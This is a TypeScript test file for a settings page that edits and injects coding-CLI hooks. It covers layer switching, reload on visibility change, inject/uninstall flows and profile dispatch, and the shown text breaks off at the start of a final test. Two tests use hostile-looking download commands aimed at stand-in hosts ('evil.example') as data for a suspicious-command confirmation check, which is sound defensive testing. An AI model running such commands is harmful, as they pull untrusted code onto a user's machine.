// settings-hooks-page.test.tsx — 设置中心 agent hooks 配置页 L2 测试（P3-TE-08 + P3-FE-21/22
// + ADR-0023 迁入 Agent 组）
//
// 覆盖：AgentHooksPage 三态渲染（loading / content / 损坏错误态）/
// 层级切换器存在与禁用逻辑（rootPath 为空 project/local 禁用）/
// 保存按钮初始禁用 / 页面重新可见（visibilitychange）轻量重读 / JsonMode 接入（P3-FE-11）/
// F2 注入/卸载按钮与注入状态条（P3-FE-21/22：三态显示、注入/卸载后刷新状态 + 重读 user 层）/
// profile 分派（KZ-1）：直渲染 cliId 对应 configEditor（桩组件标记断言）/
// configEditor 缺失空态 / 层级切换器数据源 = profile.configLayers（KZ-4）/
// restartHint 由 profile 驱动（MC-222/506）。
//
// ADR-0023：CLI 选择行已删（导航按 agent 分节，页 id = agent.<cliId>.<page>）——
// 选择行/selectedCli 持久化/dirty 守卫切换用例随之消亡（dirty 切页守卫由壳承担，
// SC-FE-07）。配置页 props = SettingsPageProps & { cliId }（壳透传 onDirtyChange）；
// 注册表用 _reset + 重注册隔离（claude profile 为 side-effect 注册，测试内自管基线）。

import { describe, it, expect, afterEach, vi, beforeEach } from "vitest";

// ── vi.hoisted：mock 状态在模块级 vi.mock 执行前就绪 ──
const { mockReadHooksConfig, mockWriteHooksConfig, mockConfirmDialog, mockJsonMode } = vi.hoisted(() => ({
  mockReadHooksConfig: vi.fn(),
  mockWriteHooksConfig: vi.fn(),
  mockConfirmDialog: vi.fn(async () => true),
  // JsonMode mock 组件：渲染 null，测试经 mockJsonMode.mock.calls 断言 props 传递
  mockJsonMode: vi.fn(() => null),
}));

// mock IPC hooks —— F2 注入/卸载/状态查询 + CP-043 确认注入（P3-FE-21/22；
// 本地覆盖 setup.ts 全局 mock 以便断言调用）
const { mockInject, mockConfirmInject, mockUninstall, mockGetInjectionStatus } = vi.hoisted(() => ({
  mockInject: vi.fn(),
  mockConfirmInject: vi.fn(),
  mockUninstall: vi.fn(),
  mockGetInjectionStatus: vi.fn(),
}));

// mock IPC hooksConfig —— 三层 hooks 子树读写
vi.mock("../ipc/hooksConfig", () => ({
  readHooksConfig: mockReadHooksConfig,
  writeHooksConfig: mockWriteHooksConfig,
}));

// mock IPC agentHooks —— F2 注入/卸载/状态查询 + 确认注入（P3-FE-21/22 + CP-043；
// 本地覆盖 setup.ts 全局 mock 以便断言调用）
vi.mock("../ipc/agentHooks", () => ({
  inject: mockInject,
  confirmInject: mockConfirmInject,
  uninstall: mockUninstall,
  getInjectionStatus: mockGetInjectionStatus,
}));

// mock JsonMode —— 隔离 CM6/schema（JsonMode 自身测试见 hooks-config-jsonmode.test.tsx；
// 编辑器随 SC-FE-05 归域 configEditor/）
vi.mock("../features/cliProfiles/profiles/claude/configEditor/JsonMode", () => ({
  default: mockJsonMode,
}));

// mock ConfirmDialog（src/lib barrel 再导出）——dirty 确认弹窗（OV-02：ask → confirmDialog）
vi.mock("../lib/ConfirmDialog", () => ({
  confirmDialog: mockConfirmDialog,
}));

// mock IPC settings —— hooksConfig store loadFromDisk 的后端读
// FE-11/D11：wrapper 返回 { data, corrupted }——无文件 = data:null, corrupted:false
vi.mock("../ipc/settings", () => ({
  loadSettings: vi.fn(async () => ({ data: null, corrupted: false })),
  saveSettings: vi.fn(async () => {}),
}));

import React from "react";
import { render, cleanup, fireEvent, waitFor, act } from "@testing-library/react";
// AgentHooksPage 为设置中心 Agent 组配置页（ADR-0023：cliId prop 直渲染 configEditor）
import AgentHooksPage from "../panels/settings/pages/AgentHooksPage";
import { useProjects } from "../stores/projects";
import { cliProfileRegistry } from "../features/cliProfiles";
import { claudeProfile, CLAUDE_CLI_ID } from "../features/cliProfiles/profiles/claude";
import type { CodingCliProfile, HooksConfigEditorProps } from "../features/cliProfiles/types";
import ClaudeHooksConfigEditor from "../features/cliProfiles/profiles/claude/configEditor/ClaudeHooksConfigEditor";
import { useLayout } from "../stores/layout";

// ── 测试 profile（用例内局部注册，用后清理——Stage 05 验证项 6 允许）──

/** hasConfigEditor=true 的测试 CLI：restartHint 用专属文案断言「提示条由 profile 驱动」；
    configEditor = 真实 ClaudeHooksConfigEditor（KZ-1 分派后 hub 经 profile.configEditor 渲染，
    现有用例编辑器行为语义保持——claude 编辑器与 profile 解耦，任意 profile 可挂载） */
const TEST_PROFILE: CodingCliProfile = {
  id: "testcli",
  displayName: "testcli",
  commands: ["testcli"],
  iconSrc: "/cli-icons/mockcli.png",
  tabTitle: "testcli",
  capabilities: {
    hooks: {
      eventToStatus: () => null,
      classifyNotification: () => null,
      computeUsagePercent: () => null,
      restartHint: "testcli 专属提示",
      hasConfigEditor: true,
      configEditor: ClaudeHooksConfigEditor,
    },
  },
};

/** 分派渲染专用 CLI：configEditor = 桩组件（渲染可识别标记 data-e2e="stub-config-editor"）——
    断言 hub 渲染的是 profile 声明的编辑器而非无条件 claude 编辑器（KZ-1） */
const STUB_PROFILE: CodingCliProfile = {
  id: "stubcli",
  displayName: "stubcli",
  commands: ["stubcli"],
  iconSrc: "/cli-icons/mockcli.png",
  tabTitle: "stubcli",
  capabilities: {
    hooks: {
      eventToStatus: () => null,
      classifyNotification: () => null,
      computeUsagePercent: () => null,
      restartHint: "stubcli 提示",
      hasConfigEditor: true,
      // 桩编辑器：渲染可识别标记（区别于 claude 编辑器内部 JsonMode/GuiMode 结构）
      configEditor: ((props: HooksConfigEditorProps) => (
        <div data-e2e="stub-config-editor">stub 编辑器：{props.profile.id}</div>
      )) as React.ComponentType<HooksConfigEditorProps>,
    },
  },
};

/** 自定义分层 CLI：configLayers 两层（project/local）——断言层切换器按 profile 声明渲染
    而非固定三层（KZ-4：数据源 = profile.capabilities.hooks.configLayers；
    FE-14 收窄后层 id 须落在 "user"|"project"|"local" 联合内） */
const LAYERS_PROFILE: CodingCliProfile = {
  id: "layerscli",
  displayName: "layerscli",
  commands: ["layerscli"],
  iconSrc: "/cli-icons/mockcli.png",
  tabTitle: "layerscli",
  capabilities: {
    hooks: {
      eventToStatus: () => null,
      classifyNotification: () => null,
      computeUsagePercent: () => null,
      restartHint: "layerscli 提示",
      hasConfigEditor: true,
      configEditor: ClaudeHooksConfigEditor,
      configLayers: [
        { id: "project", label: "Project", hint: "项目层" },
        { id: "local", label: "Local", hint: "本地层" },
      ],
    },
  },
};

/** 声明不一致 CLI：hasConfigEditor=true 但 configEditor 缺失 → 编辑器槽空态占位防御（KZ-1） */
const GAP_PROFILE: CodingCliProfile = {
  id: "gapcli",
  displayName: "gapcli",
  commands: ["gapcli"],
  iconSrc: "/cli-icons/mockcli.png",
  tabTitle: "gapcli",
  capabilities: {
    hooks: {
      eventToStatus: () => null,
      classifyNotification: () => null,
      computeUsagePercent: () => null,
      restartHint: "gapcli 提示",
      hasConfigEditor: true,
      // 故意缺 configEditor——空态占位用例专用
    },
  },
};

// ── 辅助函数：种子 stores（照 commit-view 模式）──
function seedProject(rootPath: string) {
  useProjects.setState({
    projects: {
      "proj-1": {
        projectId: "proj-1",
        name: "测试项目",
        rootPath,
        pages: [
          {
            pageId: "page-1",
            name: "操作页面 1",
            layout: {},
            createdAt: 1,
            lastAccessedAt: 1,
          },
        ],
        activePageId: "page-1",
        version: 1,
      },
    },
    deletionLock: { pendingDelete: null, acquiredAt: null },
    expandedNodes: { "proj-1": true },
  });
  useLayout.setState({ activePageId: "page-1" });
}

function resetStores() {
  useProjects.setState({
    projects: {},
    deletionLock: { pendingDelete: null, acquiredAt: null },
    expandedNodes: {},
  });
  useLayout.setState({ activePageId: null });
}

/** 注册表重置为指定集合（claude profile 为 side-effect 注册，测试内自管基线） */
function registerOnly(profiles: CodingCliProfile[]) {
  cliProfileRegistry._reset();
  for (const p of profiles) cliProfileRegistry.register(p);
}

/** 渲染 agent hooks 配置页（ADR-0023：cliId prop 直渲染对应 profile 的 configEditor，
    缺省 claude） */
function renderPanel(cliId: string = CLAUDE_CLI_ID) {
  return render(
    React.createElement(AgentHooksPage, {
      cliId,
      onDirtyChange: vi.fn(),
    }),
  );
}

// ── visibilitychange 辅助：jsdom 中派发事件不会自动改 visibilityState，
//    需先 defineProperty 覆盖（configurable 允许 afterEach 还原）；默认 "visible"。
function setVisibilityState(state: "visible" | "hidden") {
  Object.defineProperty(document, "visibilityState", { value: state, configurable: true });
}

/** 派发 visibilitychange（调用前按需 setVisibilityState） */
function dispatchVisibilityChange() {
  fireEvent(document, new Event("visibilitychange"));
}

describe("AgentHooksPage 渲染", () => {
  beforeEach(() => {
    mockReadHooksConfig.mockReset();
    mockWriteHooksConfig.mockReset();
    mockConfirmDialog.mockReset();
    mockConfirmDialog.mockResolvedValue(true);
    mockJsonMode.mockClear();
    // F2 mock 默认值：挂载 effect 会查询注入状态（不设默认则返回 undefined 使状态条显示崩溃）
    mockInject.mockReset();
    mockConfirmInject.mockReset();
    mockUninstall.mockReset();
    mockGetInjectionStatus.mockReset();
    mockGetInjectionStatus.mockResolvedValue({ status: "notInjected", version: null });
    resetStores();
    registerOnly([claudeProfile]);
  });

  afterEach(() => {
    cleanup();
    Reflect.deleteProperty(document, "visibilityState"); // 还原 jsdom 默认可见（无自有属性时 no-op）
    registerOnly([claudeProfile]); // 恢复全局基线（防泄漏到同文件后续用例）
  });

  it("loading 态：显示加载中...", async () => {
    let resolveRead!: (v: unknown) => void;
    mockReadHooksConfig.mockReturnValueOnce(
      new Promise((r) => {
        resolveRead = r;
      }),
    );
    const { getByText } = renderPanel();
    // 首帧即 loading（初始 loading=true，read 未完成）
    expect(getByText("加载中...")).toBeTruthy();
    await act(async () => {
      resolveRead({});
    });
  });

  it("content 态：层级切换器 + 优先级标注 + 保存按钮 + 模式占位文案", async () => {
    mockReadHooksConfig.mockResolvedValueOnce({
      PreToolUse: [{ hooks: [{ type: "command", command: "echo hi" }] }],
    });
    const { getByRole, getByText } = renderPanel();
    // 三态完成后渲染工具栏
    await waitFor(() => expect(getByRole("button", { name: "User" })).toBeTruthy());
    expect(getByRole("button", { name: "Project" })).toBeTruthy();
    expect(getByRole("button", { name: "Local" })).toBeTruthy();
    expect(getByText("优先级：Local > Project > User")).toBeTruthy();
    // 保存按钮：初始无未保存修改 → 禁用
    const saveBtn = getByRole("button", { name: "保存" }) as HTMLButtonElement;
    expect(saveBtn.disabled).toBe(true);
    // 模式容器：JsonMode 已接入（P3-FE-11）——value 为 hooks 子树序列化 JSON
    expect(mockJsonMode).toHaveBeenCalled();
    const lastCall = mockJsonMode.mock.calls[mockJsonMode.mock.calls.length - 1] as unknown as [
      { value: string },
    ];
    expect(JSON.parse(lastCall[0].value)).toEqual({
      PreToolUse: [{ hooks: [{ type: "command", command: "echo hi" }] }],
    });
  });

  it("损坏错误态：read 返回 Err 显示「配置文件损坏，请先修复」（与无配置 null 区分）", async () => {
    mockReadHooksConfig.mockRejectedValueOnce(new Error("settings.json 损坏"));
    const { getByText } = renderPanel();
    await waitFor(() => expect(getByText("配置文件损坏，请先修复")).toBeTruthy());
  });

  it("无 rootPath 时 Project/Local 层禁用，仅 User 可用", async () => {
    mockReadHooksConfig.mockResolvedValueOnce({});
    const { getByRole } = renderPanel();
    const userBtn = (await waitFor(() => getByRole("button", { name: "User" }))) as HTMLButtonElement;
    expect(userBtn.disabled).toBe(false);
    expect((getByRole("button", { name: "Project" }) as HTMLButtonElement).disabled).toBe(true);
    expect((getByRole("button", { name: "Local" }) as HTMLButtonElement).disabled).toBe(true);
  });

  it("有 rootPath 时 Project/Local 层可用", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValueOnce({});
    const { getByRole } = renderPanel();
    await waitFor(() => getByRole("button", { name: "User" }));
    expect((getByRole("button", { name: "Project" }) as HTMLButtonElement).disabled).toBe(false);
    expect((getByRole("button", { name: "Local" }) as HTMLButtonElement).disabled).toBe(false);
  });

  it("点击层级按钮切换到 project 层并重读（携 rootPath）", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValue({});
    const { getByRole } = renderPanel();
    const projectBtn = await waitFor(() => getByRole("button", { name: "Project" }));
    fireEvent.click(projectBtn);
    await waitFor(() => {
      const calls = mockReadHooksConfig.mock.calls;
      const last = calls[calls.length - 1];
      // 泛化命令 cliId 首参 = 页 cliId（renderPanel 缺省 claude，值 = CLAUDE_CLI_ID）
      expect(last[0]).toBe(CLAUDE_CLI_ID);
      expect(last[1]).toBe("project");
      expect(last[2]).toBe("C:/proj");
    });
  });

  it("页面重新可见（visibilitychange）触发轻量重读（外部修改检测）", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValue({});
    renderPanel();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    // 模拟切回前台：置可见态再派发 visibilitychange（jsdom 不会自动翻状态）
    setVisibilityState("visible");
    dispatchVisibilityChange();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBeGreaterThanOrEqual(2));
  });

  it("visibilitychange 时面板不可见（display:none）不触发重读", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValue({});
    const { container } = renderPanel();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    // Dockview 页面显隐为 CSS display:none——祖先或自身不可见时跳过（后台页面不重读）
    (container.firstElementChild as HTMLElement).style.display = "none";
    dispatchVisibilityChange();
    await new Promise((r) => setTimeout(r, 20));
    expect(mockReadHooksConfig.mock.calls.length).toBe(1);
  });

  it("visibilityState 为 hidden（切到后台）时不触发重读", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValue({});
    renderPanel();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    // 切后台的 visibilitychange：先置 hidden 再派发——handler 开头状态过滤，不重读
    setVisibilityState("hidden");
    dispatchVisibilityChange();
    await new Promise((r) => setTimeout(r, 20));
    expect(mockReadHooksConfig.mock.calls.length).toBe(1);
    // 恢复可见后再派发 → 正常触发（证明过滤的是状态而非监听器缺失）
    setVisibilityState("visible");
    dispatchVisibilityChange();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBeGreaterThanOrEqual(2));
  });

  it("面板内点击不触发重读（无 visibilitychange，验收 #1 语义延续）", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValue({});
    const { container } = renderPanel();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    const innerButton = await waitFor(
      () => container.querySelector('[data-e2e="hooks-layer-user"]') as HTMLElement,
    );
    fireEvent.click(innerButton);
    await new Promise((r) => setTimeout(r, 20));
    expect(mockReadHooksConfig.mock.calls.length).toBe(1);
  });

  it("JSON 错误提示单行截断（长消息不换行撑高工具栏，验收 1.2）", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValue({});
    const { container } = renderPanel();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    const longMsg =
      "JSON 语法错误：Expected ',' or '}' after property value in JSON at position 123 (line 4 column 7) #/PreToolUse/0/hooks/0";
    act(() => {
      const props = mockJsonMode.mock.calls[
        mockJsonMode.mock.calls.length - 1
      ] as unknown as [{ onValidationChange: (v: boolean, d: { message: string }[]) => void }];
      props[0].onValidationChange(false, [{ message: longMsg }]);
    });
    const err = container.querySelector('[data-e2e="hooks-json-error"]') as HTMLElement;
    expect(err).toBeTruthy();
    // 单行截断：nowrap + ellipsis + 宽度上限；完整消息挂 title
    expect(err.style.whiteSpace).toBe("nowrap");
    expect(err.style.textOverflow).toBe("ellipsis");
    expect(err.style.maxWidth).toBe("240px");
    expect(err.title).toBe(longMsg);
  });

  it("非法 JSON onChange → configJson 保持原快照 + 保存按钮禁用 + 不崩溃（HKC-03）", async () => {
    seedProject("C:/proj");
    const INITIAL = { PreToolUse: [{ hooks: [{ type: "command", command: "echo hi" }] }] };
    mockReadHooksConfig.mockResolvedValueOnce(INITIAL);
    const { container } = renderPanel();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    // 非法 JSON 进入 handleJsonChange：JSON.parse 抛错被 catch——configJson 保留最后合法快照
    act(() => {
      // calls[i] 为参数数组，props 在 calls[i][0]
      const props = mockJsonMode.mock.calls[
        mockJsonMode.mock.calls.length - 1
      ] as unknown as [
        {
          onChange: (t: string) => void;
          onValidationChange: (v: boolean, d: { message: string }[]) => void;
        },
      ];
      props[0].onChange('{ "PreToolUse": ');
      // 校验上报非法 → jsonValid=false（真实 JsonMode 中与 onChange 同批触发）
      props[0].onValidationChange(false, [{ message: "JSON 语法错误：Unexpected token" }]);
    });
    // 快照保持：JsonMode value 仍为初始合法配置（onChange 非法文本未覆盖 configJson）
    const lastCall = mockJsonMode.mock.calls[
      mockJsonMode.mock.calls.length - 1
    ] as unknown as [{ value: string }];
    expect(JSON.parse(lastCall[0].value)).toEqual(INITIAL);
    // 保存按钮禁用（jsonValid=false 门控）
    const saveBtn = container.querySelector('[data-e2e="hooks-save"]') as HTMLButtonElement;
    expect(saveBtn.disabled).toBe(true);
    // 不崩溃：面板仍在渲染（页根 + 模式容器存在）
    expect(container.querySelector('[data-e2e="agent-hooks-page-claude"]')).toBeTruthy();
    expect(container.querySelector('[data-e2e="hooks-mode-container"]')).toBeTruthy();
  });

  it("confirmDialog 弹窗打开期间 visibilitychange 回归不二次弹窗（验收 2.1 防循环）", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValue({});
    mockConfirmDialog.mockReturnValue(new Promise(() => {})); // 弹窗挂起（模拟确认框打开中）
    const { container } = renderPanel();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    // 置 dirty（合法 JSON 编辑 → updateConfigJson）
    act(() => {
      // calls[i] 为参数数组，props 在 calls[i][0]（照「content 态」用例 lastCall[0] 模式）
      const props = mockJsonMode.mock.calls[
        mockJsonMode.mock.calls.length - 1
      ] as unknown as [{ onChange: (t: string) => void }];
      props[0].onChange(
        JSON.stringify({ PreToolUse: [{ hooks: [{ type: "command", command: "x" }] }] }),
      );
    });
    // 第一次 visibilitychange（切回前台）→ reload → confirmDiscard → confirmDialog（挂起）
    dispatchVisibilityChange();
    await new Promise((r) => setTimeout(r, 0));
    expect(mockConfirmDialog).toHaveBeenCalledTimes(1);
    // 弹窗关闭的回归（visibilitychange）→ askGuard 抑制，不二次弹窗（点否循环根治）
    dispatchVisibilityChange();
    await new Promise((r) => setTimeout(r, 20));
    expect(mockConfirmDialog).toHaveBeenCalledTimes(1);
    expect(container.firstElementChild).toBeTruthy();
  });
});

describe("F2 注入/卸载与注入状态条（P3-FE-21/22）", () => {
  beforeEach(() => {
    mockReadHooksConfig.mockReset();
    mockConfirmDialog.mockReset();
    mockConfirmDialog.mockResolvedValue(true);
    mockInject.mockReset();
    mockConfirmInject.mockReset();
    mockUninstall.mockReset();
    mockGetInjectionStatus.mockReset();
    mockGetInjectionStatus.mockResolvedValue({ status: "notInjected", version: null });
    resetStores();
    registerOnly([claudeProfile]);
  });

  afterEach(() => {
    cleanup();
    registerOnly([claudeProfile]);
  });

  it("挂载后显示注入状态三态（已注入 / 未注入 / 版本过旧）——挂载 effect 查询一次", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    // 已注入
    mockGetInjectionStatus.mockResolvedValue({ status: "injected", version: 1 });
    const first = renderPanel();
    await waitFor(() => expect(first.getByText("注入状态：已注入")).toBeTruthy());
    first.unmount();
    // 版本过旧（重新挂载触发新查询）
    mockGetInjectionStatus.mockResolvedValue({ status: "outdated", version: 0 });
    const second = renderPanel();
    await waitFor(() => expect(second.getByText("注入状态：版本过旧")).toBeTruthy());
    second.unmount();
    // 未注入（重新挂载触发新查询）
    mockGetInjectionStatus.mockResolvedValue({ status: "notInjected", version: null });
    const third = renderPanel();
    await waitFor(() => expect(third.getByText("注入状态：未注入")).toBeTruthy());
  });

  it("查询完成前注入状态条显示初始 '--'（HKC-10：初始 null 帧展示）", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    // getInjectionStatus 挂起（IPC 查询未返回）——content 态首帧 injectionStatus=null
    mockGetInjectionStatus.mockReturnValue(new Promise(() => {}));
    const { container } = renderPanel();
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    // 状态条（data-e2e hooks-injection-status）初始帧显示「注入状态：--」
    const statusEl = container.querySelector(
      '[data-e2e="hooks-injection-status"]',
    ) as HTMLElement;
    expect(statusEl).toBeTruthy();
    expect(statusEl.textContent).toBe("注入状态：--");
    // 查询未完成时状态条恒为 '--'，不出现三态文案
    expect(container.textContent).not.toContain("注入状态：已注入");
    expect(container.textContent).not.toContain("注入状态：未注入");
    expect(container.textContent).not.toContain("注入状态：版本过旧");
  });

  it("点击「注入 Hooks」→ inject 调用 → 状态刷新为已注入 → 重读 user 层配置", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    mockInject.mockResolvedValue({ status: "injected", version: 1 });
    const { getByRole } = renderPanel();
    const injectBtn = await waitFor(() => getByRole("button", { name: "注入 Hooks" }));
    const callsBefore = mockReadHooksConfig.mock.calls.length;
    fireEvent.click(injectBtn);
    await waitFor(() => expect(mockInject).toHaveBeenCalled());
    // 注入后重读 user 层（当前层即 user → reload）；泛化命令 cliId 首参 = 页 cliId（缺省 claude）
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(callsBefore + 1));
    expect(mockReadHooksConfig.mock.calls[mockReadHooksConfig.mock.calls.length - 1][1]).toBe("user");
    expect(mockReadHooksConfig.mock.calls[mockReadHooksConfig.mock.calls.length - 1][0]).toBe(CLAUDE_CLI_ID);
    expect(mockInject).toHaveBeenCalledWith(CLAUDE_CLI_ID);
  });

  it("project 层点注入 → 自动切到 user 层重读（最后一次 read 为 user 层）", async () => {
    seedProject("C:/proj");
    mockReadHooksConfig.mockResolvedValue({});
    mockInject.mockResolvedValue({ status: "injected", version: 1 });
    const { getByRole } = renderPanel();
    const projectBtn = await waitFor(() => getByRole("button", { name: "Project" }));
    fireEvent.click(projectBtn);
    await waitFor(() => {
      const calls = mockReadHooksConfig.mock.calls;
      expect(calls[calls.length - 1][1]).toBe("project");
    });
    fireEvent.click(getByRole("button", { name: "注入 Hooks" }));
    await waitFor(() => expect(mockInject).toHaveBeenCalledWith(CLAUDE_CLI_ID));
    await waitFor(() => {
      const calls = mockReadHooksConfig.mock.calls;
      expect(calls[calls.length - 1][1]).toBe("user");
    });
  });

  it("点击「卸载 Hooks」→ uninstall 调用 → 重新查询状态 → 重读 user 层配置", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    mockGetInjectionStatus.mockResolvedValue({ status: "notInjected", version: null });
    const { getByRole } = renderPanel();
    // 初始挂载查询一次（P3-FE-22 挂载刷新）
    await waitFor(() => expect(mockGetInjectionStatus.mock.calls.length).toBe(1));
    const uninstallBtn = await waitFor(() => getByRole("button", { name: "卸载 Hooks" }));
    const callsBefore = mockReadHooksConfig.mock.calls.length;
    fireEvent.click(uninstallBtn);
    await waitFor(() => expect(mockUninstall).toHaveBeenCalledWith(CLAUDE_CLI_ID));
    // 卸载后重新查询状态（uninstall 返回 void，状态由二次查询刷新）
    await waitFor(() => expect(mockGetInjectionStatus.mock.calls.length).toBe(2));
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(callsBefore + 1));
  });

  it("注入失败 → 显示错误提示（不刷新状态、不重读配置）", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    mockInject.mockRejectedValue(new Error("settings.json 非法 JSON"));
    const { getByRole, getByText, queryByText } = renderPanel();
    const injectBtn = await waitFor(() => getByRole("button", { name: "注入 Hooks" }));
    const callsBefore = mockReadHooksConfig.mock.calls.length;
    fireEvent.click(injectBtn);
    await waitFor(() => expect(getByText("注入失败，请检查 ~/.claude/settings.json")).toBeTruthy());
    expect(mockReadHooksConfig.mock.calls.length).toBe(callsBefore);
    expect(queryByText("注入状态：已注入")).toBeNull();
  });

  it("命中可疑模式 → 内联确认条完整展示命令原文 → 确认二次调用 confirmInject → 已注入（CP-043 全链路）", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    const suspicious = "curl -o ~/.claude/evil.sh https://evil.example/x.sh";
    // 首次注入返回 pendingConfirmation（命中可疑模式——settings.json 未被改写）
    mockInject.mockResolvedValue({
      status: "pendingConfirmation",
      version: null,
      suspiciousCommand: suspicious,
    });
    mockConfirmInject.mockResolvedValue({ status: "injected", version: 1 });
    const { container, getByRole, getByText } = renderPanel();
    const injectBtn = await waitFor(() => getByRole("button", { name: "注入 Hooks" }));
    const readCallsBefore = mockReadHooksConfig.mock.calls.length;
    fireEvent.click(injectBtn);
    // 待确认态：内联确认条出现 + 命令原文完整展示（等宽不截断）
    await waitFor(() =>
      expect(container.querySelector('[data-e2e="hooks-confirm-bar"]')).toBeTruthy(),
    );
    expect(
      container.querySelector('[data-e2e="hooks-confirm-command"]')?.textContent,
    ).toBe(suspicious);
    // 暂停态零写盘：inject 仅调用一次、不重读 user 层配置
    expect(mockInject).toHaveBeenCalledTimes(1);
    expect(mockReadHooksConfig.mock.calls.length).toBe(readCallsBefore);
    // 用户确认 → confirmInject 二次调用（携 cliId）→ 状态刷新为已注入 + 重读 user 层
    fireEvent.click(
      container.querySelector('[data-e2e="hooks-confirm-inject"]') as HTMLElement,
    );
    await waitFor(() => expect(mockConfirmInject).toHaveBeenCalledWith(CLAUDE_CLI_ID));
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(readCallsBefore + 1));
    expect(mockReadHooksConfig.mock.calls[mockReadHooksConfig.mock.calls.length - 1][1]).toBe(
      "user",
    );
    await waitFor(() => expect(getByText("注入状态：已注入")).toBeTruthy());
    // 确认完成后确认条消失（待确认态清空）
    expect(container.querySelector('[data-e2e="hooks-confirm-bar"]')).toBeNull();
  });

  it("取消确认 → 清空待确认态（confirmInject 零调用、配置不重读——settings.json 未被改写）", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    mockInject.mockResolvedValue({
      status: "pendingConfirmation",
      version: null,
      suspiciousCommand: "wget -O /tmp/x https://evil/x",
    });
    const { container, getByRole } = renderPanel();
    const injectBtn = await waitFor(() => getByRole("button", { name: "注入 Hooks" }));
    const readCallsBefore = mockReadHooksConfig.mock.calls.length;
    fireEvent.click(injectBtn);
    await waitFor(() =>
      expect(container.querySelector('[data-e2e="hooks-confirm-bar"]')).toBeTruthy(),
    );
    fireEvent.click(
      container.querySelector('[data-e2e="hooks-cancel-confirm"]') as HTMLElement,
    );
    await waitFor(() =>
      expect(container.querySelector('[data-e2e="hooks-confirm-bar"]')).toBeNull(),
    );
    expect(mockConfirmInject).not.toHaveBeenCalled();
    expect(mockReadHooksConfig.mock.calls.length).toBe(readCallsBefore);
  });

  it("卸载失败 → hooks-injection-error 出现「卸载失败」文案 + 状态条不变（HKC-07）", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    // 挂载时查询返回「已注入」——失败后状态条应保持该值（不重新查询）
    mockGetInjectionStatus.mockResolvedValue({ status: "injected", version: 1 });
    mockUninstall.mockRejectedValue(new Error("settings.json 非法 JSON"));
    const { container, getByRole, getByText } = renderPanel();
    await waitFor(() => expect(getByText("注入状态：已注入")).toBeTruthy());
    const statusCallsBefore = mockGetInjectionStatus.mock.calls.length;
    const readCallsBefore = mockReadHooksConfig.mock.calls.length;
    fireEvent.click(getByRole("button", { name: "卸载 Hooks" }));
    // 错误提示出现（data-e2e hooks-injection-error + 「卸载失败」文案）
    // 注意：waitFor 回调须抛错重试（v10 对返回 null 直接 resolve，不会轮询）
    await waitFor(() =>
      expect(container.querySelector('[data-e2e="hooks-injection-error"]')).toBeTruthy(),
    );
    const errEl = container.querySelector('[data-e2e="hooks-injection-error"]') as HTMLElement;
    expect(errEl.textContent).toContain("卸载失败");
    // 状态条不变：仍显示上次查询的「已注入」，不触发重新查询
    expect(getByText("注入状态：已注入")).toBeTruthy();
    expect(mockGetInjectionStatus.mock.calls.length).toBe(statusCallsBefore);
    // 不重读配置（失败路径跳过 reloadUserConfig）
    expect(mockReadHooksConfig.mock.calls.length).toBe(readCallsBefore);
  });

  it("注入/卸载操作期间按钮禁用（防重复点击）", async () => {
    mockReadHooksConfig.mockResolvedValue({});
    let resolveInject!: (v: { status: string }) => void;
    mockInject.mockReturnValue(
      new Promise((r) => {
        resolveInject = r;
      }),
    );
    const { getByRole } = renderPanel();
    const injectBtn = await waitFor(() => getByRole("button", { name: "注入 Hooks" }));
    fireEvent.click(injectBtn);
    await waitFor(() => expect((injectBtn as HTMLButtonElement).disabled).toBe(true));
    expect((getByRole("button", { name: "卸载 Hooks" }) as HTMLButtonElement).disabled).toBe(true);
    await act(async () => {
      resolveInject({ status: "injected" });
    });
  });
});

// ═══════════════════════════════════════════════════════════════════
// profile 分派（ADR-0023：选择行已删——AgentHooksPage 直渲染 cliId 对应
// configEditor；KZ-1/KZ-4/MC-222 语义经 cliId prop 直传保留）
// ═══════════════════════════════════════════════════════════════════
describe("profile 分派（直渲染 cliId 编辑器）", () => {
  beforeEach(() => {
    mockReadHooksConfig.mockReset();
    mockWriteHooksConfig.mockReset();
    mockConfirmDialog.mockReset();
    mockConfirmDialog.mockResolvedValue(true);
    mockJsonMode.mockClear();
    mockInject.mockReset();
    mockConfirmInject.mockReset();
    mockUninstall.mockReset();
    mockGetInjectionStatus.mockReset();
    mockGetInjectionStatus.mockResolvedValue({ status: "notInjected", version: null });
    resetStores();
    registerOnly([claudeProfile]);
  });

  afterEach(() => {
    cleanup();
    registerOnly([claudeProfile]);
  });

  it("分派：编辑器经 profile.configEditor 渲染（KZ-1——桩组件标记出现，claude 编辑器内部 JsonMode 零调用）", async () => {
    registerOnly([claudeProfile, STUB_PROFILE]);
    const { container } = renderPanel(STUB_PROFILE.id);
